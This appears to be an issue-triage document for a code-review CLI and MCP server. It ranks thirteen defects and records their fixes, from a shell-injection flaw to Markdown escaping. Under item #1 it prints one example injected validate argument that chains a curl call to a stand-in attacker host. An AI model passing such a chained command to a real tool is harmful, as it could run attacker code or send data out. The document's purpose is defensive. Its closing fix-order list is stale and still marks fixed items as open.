# Issue Triage

Findings from reviewing `cli.ts`, `git.ts`, `validation.ts`, `review.ts`, and
`mcp-server.ts`. Includes the defects seeded/documented in the codebase plus
additional issues found during review. Ranked by severity to guide fix order.

Status key: 🔴 open · ✅ fixed

---

## Critical

### 1. Shell injection in validation commands — `validation.ts:27` ✅ FIXED
`exec(command, { cwd }, ...)` ran the command string through a shell.
Any shell metacharacter (`;`, `&&`, `|`, backticks, `$()`) let a validation
command chain in arbitrary additional commands.

- **Root cause**: used `exec()` (shell-interpreted) instead of
  `execFile`/`spawn` with an argv array (never shell-interpreted).
- **Example**: `--validate "npm test; curl attacker.com/steal"` ran both.
- **Why tests missed it**: the test suite only ever passed safe, literal
  commands like `npm test`.
- **Impact**: arbitrary code execution for anyone who can influence the
  `--validate` argument (including AI agents calling this via MCP).
- **Fix applied**: switched to `execFile(program, args, ...)` with a small
  quote-aware tokenizer that splits the command string into a program and
  argv array. Shell operators now pass through as literal argument text —
  they're never interpreted. Trade-off: shell chaining (`&&`, `;`, pipes)
  in a single `--validate` string no longer works by design; use repeatable
  `--validate` flags to run multiple commands instead.

### 2. Validation failure crashes report generation — `validation.ts:26-35` ✅ FIXED
A failing command (non-zero exit, "command not found", etc.) called
`reject(error)` instead of resolving with a `status: "failed"` result. The
uncaught rejection propagated up through `runValidationCommands` and crashed
the entire report generation — one failing check took down the whole tool.

- **Root cause**: error branch used `reject()` instead of `resolve()` with a
  structured failure object.
- **Why tests missed it**: the only test that runs a validation command
  happens to use one that passes.
- **Impact**: the tool is unusable in the most common real scenario — a
  check that's supposed to catch problems actually catching one.
- **Fix applied**: error branch now resolves
  `{ command, status: "failed", output: stdout || stderr || error.message }`
  so failures become data instead of exceptions.

---

## High

### 3. Hardcoded "main" as base branch — `git.ts:23-24` ✅ FIXED
`const base = baseRef ?? "main"` silently assumed "main" was always the
default branch, with no fallback or detection.

- **Root cause**: no lookup of the repo's actual default branch (e.g. via
  `git symbolic-ref` or checking for `master`).
- **Why tests missed it**: the fixture repo's default branch is "main".
- **Impact**: repos using "master" (or any other default branch name) got
  an empty or wrong changed-file list with no warning — silent incorrect
  output, not a crash.
- **Fix applied**: added `resolveBaseRef()` — uses an explicit `baseRef` if
  given, otherwise tries `"main"` then `"master"` (via
  `git rev-parse --verify --quiet`), throwing a clear error if neither
  exists rather than silently defaulting.

### 4. Untracked files excluded from changed-file list — `git.ts:24` ✅ FIXED
Only `git diff --name-status base...HEAD` was run, which only sees tracked
diffs. New, not-yet-added files never appeared.

- **Root cause**: no call to something like `git status --porcelain` to
  pick up untracked files.
- **Why tests missed it**: the fixture only exercised tracked changes.
- **Impact**: incomplete review coverage — new files a reviewer most wants
  to see could be silently missing from the report.
- **Fix applied**: added `git ls-files --others --exclude-standard` and
  appended results with `status: "untracked"` (the status already existed
  on the `ChangedFile` type but was never populated). Gitignored files are
  correctly excluded since `--exclude-standard` respects `.gitignore`.

### 5. No timeout on validation commands — `validation.ts:27` ✅ FIXED
`exec(command, { cwd }, ...)` had no `timeout` option.

- **Root cause**: missing execution bound.
- **Impact**: a hanging command (accidental infinite loop, or malicious
  `sleep 999999`) hung report generation indefinitely — a self-inflicted
  denial of service with no recovery.
- **Fix applied**: `runValidationCommand`/`runValidationCommands` now take
  an optional `timeoutMs` (default 5 minutes), passed to `execFile`'s
  `timeout` option. A killed command resolves as `status: "failed"` with
  output `Command timed out after <ms>ms` instead of hanging forever.
  Verified live via the actual CLI with the default temporarily lowered to
  2s: a genuinely hanging command was killed at ~2.2s with a clean report.

### 6. No error handling for missing/invalid base ref — `git.ts:24` ✅ FIXED
If `baseRef` (or the "main" default) didn't exist in the repo,
`execFileSync` threw a raw git error that propagated uncaught.

- **Root cause**: no try/catch or validation before diffing.
- **Impact**: user saw a raw `fatal: ambiguous argument 'main...HEAD'`
  stack trace instead of an actionable error message.
- **Fix applied**: wrapped the `git diff` call in try/catch, rethrowing a
  clear message: `Base ref "<ref>" not found in this repository. Pass
  --base-ref <ref> to specify a valid one.`

### 7. MCP schema/handler property mismatch — `mcp-server.ts:35` ✅ FIXED
The tool's Zod schema advertised `repositoryPath`, but the handler read
`input.repoPath` (note: `@ts-expect-error` was suppressing the type error).

- **Root cause**: property name typo/mismatch between schema and handler.
- **Why tests missed it**: the MCP server had no test coverage at all.
- **Impact**: every MCP call resolved `repositoryPath` to `undefined`, so
  the tool silently inspected `undefined` instead of the requested repo —
  a 100% failure rate with no workaround, unlike the other High-severity
  issues which only fail under specific conditions.
- **Fix applied**: extracted the handler body into an exported
  `reviewRepository(input: ReviewRepositoryInput)` function with a typed
  input (`repositoryPath: string`), so the property name is now enforced
  by the type system instead of silently suppressed. Also guarded the
  `server.connect()` startup behind an `import.meta.url` check so the
  module can be imported and its logic tested without spinning up a real
  stdio server.

---

## Medium

### 8. CLI re-splits already-correct argv values — `cli.ts:36` ✅ FIXED
`parsed.repo = argv[++i]?.split(" ")[0]` re-split a shell-provided argv
value on spaces, truncating any path containing one.

- **Root cause**: defensive-but-wrong assumption that argv might contain
  unsplit strings; Node/the shell already hand this function correctly
  split arguments.
- **Example**: `--repo "./my project"` silently became `./my`.
- **Why tests missed it**: the fixture path has no spaces.
- **Impact**: broke on any repo path with a space — common on macOS
  (`~/Desktop/My Project`) and Windows. Picked as the first Medium fix
  since, unlike the High-severity issues, there was no workaround at all —
  quoting the argument correctly didn't help, since the bug re-split an
  already-correctly-parsed value.
- **Fix applied**: `parsed.repo = argv[++i]` — take the argv value as-is.
  Verified with a red/green check (reintroduced the bug, confirmed the new
  test failed with the path truncated to a nonexistent directory, then
  restored the fix) and a real-world run against an actual `.../my
  project` directory.

### 9. Report doesn't distinguish pass/fail/skip — `review.ts:20-36` ✅ FIXED
The report listed changed files and dumped raw validation stdout/stderr,
with no summary of which checks passed, failed, or were skipped.

- **Root cause**: report builder just concatenated raw output with no
  status aggregation or visual distinction (e.g. ✅/❌ markers, summary
  counts).
- **Why tests missed it**: tests only asserted that expected substrings
  were present, not that the report was actually legible.
- **Impact**: a human or AI reader had to read every line of output to
  figure out overall pass/fail — defeated the purpose of a review report.
- **Fix applied**: added a "Validation summary" section up top with an
  overall count (`✅ All N check(s) passed.` / `❌ N of M check(s)
  failed.`) and a per-command ✅/❌ checklist, plus the same icon on each
  detailed output section below. Also made empty `changedFiles`/
  `validationResults` explicit (`_No changed files detected._` /
  `_No validation commands were run._`) instead of silently rendering an
  empty section.

### 10. Test suite only covers the happy path — `test/cli.test.ts` 🔴
The only CLI test uses a repo path with no spaces, a valid base ref, and no
failing commands. It also depends on CWD and mutates fixtures in place
rather than using an isolated temp dir.

- **Root cause**: no negative-path or edge-case tests written.
- **Impact**: none of the above defects (#1, #3, #4, #6, #7, #8) are
  caught by CI — they only surface in real usage.

---

## Low

### 11. `stdout || stderr` fallback masks output source — `validation.ts:33` 🔴
If `stdout` is `""` (falsy), output falls back to `stderr` with no marker
of which stream it came from; if both are non-empty, `stderr` is dropped
entirely.

- **Root cause**: naive `||` fallback instead of showing/labeling both
  streams.
- **Impact**: minor — makes it harder to tell build output from error
  logs in the report, but doesn't cause incorrect pass/fail status.

### 12. Repository path not escaped in Markdown — `review.ts:22` 🔴
`# Review Report: ${input.repositoryPath}` is interpolated directly into
Markdown with no escaping.

- **Root cause**: no sanitization of user-controlled path before
  embedding in Markdown output.
- **Impact**: a path containing Markdown syntax (`[`, `]`, backticks) can
  corrupt report rendering. Low severity — cosmetic, not a security issue
  since this isn't rendered as HTML.

### 13. MCP server launch/config undocumented — `mcp-server.ts:1-5` 🔴
The README doesn't document how to register/launch the MCP server (this is
called out directly in the file's own header comment).

- **Root cause**: documentation gap, not a code bug.
- **Impact**: the MCP tool is effectively undiscoverable to anyone who
  hasn't read the source.

---

## Suggested Fix Order

1. ✅ #2 Validation failure crash (done)
2. 🔴 #1 Shell injection (validation.ts)
3. 🔴 #3 / #4 / #6 Git branch handling (git.ts)
4. 🔴 #7 MCP schema mismatch
5. 🔴 #8 CLI arg space-splitting
6. 🔴 #9 Report quality
7. 🔴 #10 Expand test coverage alongside each fix above
8. 🔴 #11 / #12 / #13 — polish, time permitting
